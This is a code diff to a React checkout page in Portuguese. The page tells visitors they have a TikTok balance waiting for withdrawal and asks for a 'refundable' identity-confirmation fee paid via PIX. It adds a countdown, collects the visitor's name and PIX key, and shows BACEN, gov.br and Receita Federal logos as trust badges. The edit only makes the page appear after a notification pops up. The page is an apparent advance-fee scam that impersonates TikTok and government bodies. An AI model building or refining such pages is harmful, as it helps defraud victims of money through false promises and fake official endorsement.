@@ -21,9 +21,10 @@ const Checkout = () => {
   const today = new Date().toLocaleDateString("pt-BR");
 
   const [countdown, setCountdown] = useState(15 * 60);
-  const [showNotification, setShowNotification] = useState(false);
+  const [showNotification, setShowNotification] = useState(true);
   const [dismissNotification, setDismissNotification] = useState(false);
   const [exitingNotification, setExitingNotification] = useState(false);
+  const [showPage, setShowPage] = useState(false);
 
   useEffect(() => {
     trackTikTokEvent({ event: "InitiateCheckout", properties: { value: TARGET, currency: "BRL" } });
@@ -36,12 +37,13 @@ const Checkout = () => {
     return () => clearInterval(interval);
   }, []);
 
-  // Show push notification immediately, slide out after 5s
+  // Show notification first, then page after 1.5s
   useEffect(() => {
-    setShowNotification(true);
+    const pageTimer = setTimeout(() => setShowPage(true), 1500);
     const exitTimer = setTimeout(() => setExitingNotification(true), 5000);
     const removeTimer = setTimeout(() => setDismissNotification(true), 5400);
     return () => {
+      clearTimeout(pageTimer);
       clearTimeout(exitTimer);
       clearTimeout(removeTimer);
     };
@@ -117,119 +119,124 @@ const Checkout = () => {
           )}
         </div>
       )}
-      {/* Logo */}
-      <div className="flex justify-center py-6">
-        <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
-      </div>
-
-      <div className="px-4 space-y-4 pb-10">
-        {/* Saldo Card */}
-        <div className="rounded-2xl bg-black p-5">
-          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-1">Saldo disponível</p>
-          <p className="text-3xl font-extrabold text-white">
-            R$ {TARGET.toFixed(2).replace(".", ",")}
-          </p>
-          <p className="text-xs text-gray-500 mt-1">Aguardando confirmação para saque</p>
-        </div>
-
-        {/* Confirmação de Identidade */}
-        <div className="rounded-2xl border border-gray-200 p-5">
-          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">Confirmação de identidade</p>
-          <div className="flex items-center gap-2 mb-3">
-            <span className="text-2xl font-normal text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span>
-            <span className="rounded-full bg-green-100 text-green-600 text-[10px] font-bold px-2 py-0.5 uppercase">Valor reembolsável</span>
+      {/* Page content - appears after notification */}
+      {showPage && (
+        <div style={{ animation: "fade-in 0.4s ease-out" }}>
+          {/* Logo */}
+          <div className="flex justify-center py-6">
+            <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
           </div>
-          <p className="text-xs text-gray-500 leading-relaxed">
-            Taxa obrigatória para liberação do saque no valor de{" "}
-            <span className="font-bold text-black">R$ {TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
-            <span className="font-bold text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
-          </p>
-        </div>
 
-        {/* Dados para Reembolso */}
-        <div className="rounded-2xl border border-gray-200 p-5">
-          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Dados para reembolso</p>
-          <div className="space-y-3">
-            <div className="flex justify-between border-b border-gray-100 pb-3 gap-4">
-              <span className="text-sm text-gray-500 shrink-0">Nome</span>
-              <span className="text-sm font-semibold text-black text-right break-words min-w-0">{nome}</span>
+          <div className="px-4 space-y-4 pb-10">
+            {/* Saldo Card */}
+            <div className="rounded-2xl bg-black p-5">
+              <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-1">Saldo disponível</p>
+              <p className="text-3xl font-extrabold text-white">
+                R$ {TARGET.toFixed(2).replace(".", ",")}
+              </p>
+              <p className="text-xs text-gray-500 mt-1">Aguardando confirmação para saque</p>
             </div>
-            <div className="flex items-center justify-between border-b border-gray-100 pb-3">
-              <span className="text-sm text-gray-500">Data</span>
-              <span className="text-sm font-semibold text-black">{today}</span>
-            </div>
-            <div className="flex items-center justify-between border-b border-gray-100 pb-3">
-              <span className="text-sm text-gray-500">Chave PIX</span>
-              <span className="text-sm font-semibold text-black capitalize">{tipoChave}</span>
-            </div>
-            <div className="flex items-center justify-between">
-              <span className="text-sm text-gray-500">Valor a receber</span>
-              <span className="text-sm font-bold text-black">R$ {TARGET.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
-            </div>
-          </div>
-          <div className="mt-4 rounded-xl border border-gray-200 py-3 text-center">
-            <p className="text-sm text-gray-600">{chavePix}</p>
-          </div>
-        </div>
 
-        {/* Processo de Liberação */}
-        <div className="rounded-2xl border border-gray-200 p-5">
-          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Processo de liberação</p>
-          <div className="space-y-4">
-            <div className="flex items-start gap-3">
-              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">1</span>
-              <div>
-                <p className="text-sm font-semibold text-black">Pagar taxa de confirmação</p>
-                <p className="text-xs text-gray-400">R$ {TAX.toFixed(2).replace(".", ",")} para verificação de identidade</p>
+            {/* Confirmação de Identidade */}
+            <div className="rounded-2xl border border-gray-200 p-5">
+              <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">Confirmação de identidade</p>
+              <div className="flex items-center gap-2 mb-3">
+                <span className="text-2xl font-normal text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span>
+                <span className="rounded-full bg-green-100 text-green-600 text-[10px] font-bold px-2 py-0.5 uppercase">Valor reembolsável</span>
+              </div>
+              <p className="text-xs text-gray-500 leading-relaxed">
+                Taxa obrigatória para liberação do saque no valor de{" "}
+                <span className="font-bold text-black">R$ {TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
+                <span className="font-bold text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
+              </p>
+            </div>
+
+            {/* Dados para Reembolso */}
+            <div className="rounded-2xl border border-gray-200 p-5">
+              <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Dados para reembolso</p>
+              <div className="space-y-3">
+                <div className="flex justify-between border-b border-gray-100 pb-3 gap-4">
+                  <span className="text-sm text-gray-500 shrink-0">Nome</span>
+                  <span className="text-sm font-semibold text-black text-right break-words min-w-0">{nome}</span>
+                </div>
+                <div className="flex items-center justify-between border-b border-gray-100 pb-3">
+                  <span className="text-sm text-gray-500">Data</span>
+                  <span className="text-sm font-semibold text-black">{today}</span>
+                </div>
+                <div className="flex items-center justify-between border-b border-gray-100 pb-3">
+                  <span className="text-sm text-gray-500">Chave PIX</span>
+                  <span className="text-sm font-semibold text-black capitalize">{tipoChave}</span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-sm text-gray-500">Valor a receber</span>
+                  <span className="text-sm font-bold text-black">R$ {TARGET.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
+                </div>
+              </div>
+              <div className="mt-4 rounded-xl border border-gray-200 py-3 text-center">
+                <p className="text-sm text-gray-600">{chavePix}</p>
               </div>
             </div>
-            <div className="flex items-start gap-3">
-              <CheckCircle2 className="h-7 w-7 shrink-0 text-green-500" />
-              <div>
-                <p className="text-sm font-semibold text-green-500">Receber reembolso automático</p>
-                <p className="text-xs text-gray-400">Valor devolvido em 1 minuto</p>
+
+            {/* Processo de Liberação */}
+            <div className="rounded-2xl border border-gray-200 p-5">
+              <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Processo de liberação</p>
+              <div className="space-y-4">
+                <div className="flex items-start gap-3">
+                  <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">1</span>
+                  <div>
+                    <p className="text-sm font-semibold text-black">Pagar taxa de confirmação</p>
+                    <p className="text-xs text-gray-400">R$ {TAX.toFixed(2).replace(".", ",")} para verificação de identidade</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <CheckCircle2 className="h-7 w-7 shrink-0 text-green-500" />
+                  <div>
+                    <p className="text-sm font-semibold text-green-500">Receber reembolso automático</p>
+                    <p className="text-xs text-gray-400">Valor devolvido em 1 minuto</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">3</span>
+                  <div>
+                    <p className="text-sm font-semibold text-black">Acessar saldo completo</p>
+                    <p className="text-xs text-gray-400 underline">R$ {TARGET.toFixed(2).replace(".", ",")} liberado para saque</p>
+                  </div>
+                </div>
               </div>
             </div>
-            <div className="flex items-start gap-3">
-              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">3</span>
-              <div>
-                <p className="text-sm font-semibold text-black">Acessar saldo completo</p>
-                <p className="text-xs text-gray-400 underline">R$ {TARGET.toFixed(2).replace(".", ",")} liberado para saque</p>
+
+            {/* CTA */}
+            <Button
+              onClick={handlePagar}
+              className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
+            >
+              Liberar Saque
+            </Button>
+
+            {/* Reembolso info */}
+            <div className="flex items-center justify-center gap-2">
+              <RefreshCw className="h-4 w-4 text-green-500" />
+              <span className="text-xs font-medium text-green-500">Reembolso automático em 1 minuto</span>
+            </div>
+
+            {/* Trust badges */}
+            <div className="flex items-center justify-center gap-8 py-4">
+              <div className="flex flex-col items-center">
+                <img src={bacenLogo} alt="BACEN" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
+              </div>
+              <div className="flex flex-col items-center">
+                <img src={govbrLogo} alt="gov.br" className="h-8 object-contain" loading="eager" decoding="async" />
+              </div>
+              <div className="flex flex-col items-center">
+                <img src={receitaLogo} alt="Receita Federal" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
               </div>
             </div>
+
+            <p className="text-xs text-gray-400 text-center">Processo 100% seguro</p>
+            <p className="text-xs text-primary text-center font-medium">Precisa de ajuda?</p>
           </div>
         </div>
-
-        {/* CTA */}
-        <Button
-          onClick={handlePagar}
-          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
-        >
-          Liberar Saque
-        </Button>
-
-        {/* Reembolso info */}
-        <div className="flex items-center justify-center gap-2">
-          <RefreshCw className="h-4 w-4 text-green-500" />
-          <span className="text-xs font-medium text-green-500">Reembolso automático em 1 minuto</span>
-        </div>
-
-        {/* Trust badges */}
-        <div className="flex items-center justify-center gap-8 py-4">
-          <div className="flex flex-col items-center">
-            <img src={bacenLogo} alt="BACEN" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
-          </div>
-          <div className="flex flex-col items-center">
-            <img src={govbrLogo} alt="gov.br" className="h-8 object-contain" loading="eager" decoding="async" />
-          </div>
-          <div className="flex flex-col items-center">
-            <img src={receitaLogo} alt="Receita Federal" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
-          </div>
-        </div>
-
-        <p className="text-xs text-gray-400 text-center">Processo 100% seguro</p>
-        <p className="text-xs text-primary text-center font-medium">Precisa de ajuda?</p>
-      </div>
+      )}
     </div>
   );
 };
